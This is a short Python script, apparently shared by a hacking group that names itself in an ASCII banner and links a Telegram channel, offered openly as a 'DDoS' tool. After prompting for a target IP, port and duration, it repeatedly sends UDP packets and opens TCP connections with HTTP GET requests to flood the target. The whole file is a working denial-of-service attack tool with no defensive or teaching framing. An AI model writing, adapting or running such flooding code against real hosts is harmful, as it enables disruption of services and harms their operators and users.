import socket
import random
import time
print("""
 ______     __  __     __  __   
/\  __ \   /\ \_\ \   /\ \/\ \   
\ \  __ \  \ \  __ \  \ \ \_\ \ 
 \ \_\ \_\  \ \_\ \_\  \ \_____\
   
  \/_/\/_/   \/_/\/_/   \/_____/""")
print(""" _____     _____     ______     ______   
/\  __-.  /\  __-.  /\  __ \   /\  ___\  
\ \ \/\ \ \ \ \/\ \ \ \ \/\ \  \ \___  \ 
 \ \____-  \ \____-  \ \_____\  \/\_____\
 
  \/____/   \/____/   \/_____/   \/_____/
  """)
  
print("Made by  team A.H.U | Netstat_stat")
print("join our Telegrame channel: https://t.me/Arab_Hackers_Union ")
def ddos(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = input("package size: ")     #random._urandom(1024)
    sock.settimeout(1)

    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            print(f"{current_time} - DDoS: {target_ip}")
            
            sock.sendto(data.encode( ), (target_ip, target_port))
            request = "GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n"
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                s.connect((target_ip, target_port))
                s.sendall(request.encode())
            
        except socket.timeout:
            print("error")
            break

    sock.close()
target_ip = input("ip: ")
target_port = int(input("port:"))
duration = int(input("attack in sec:"))
ddos(target_ip, target_port, duration)
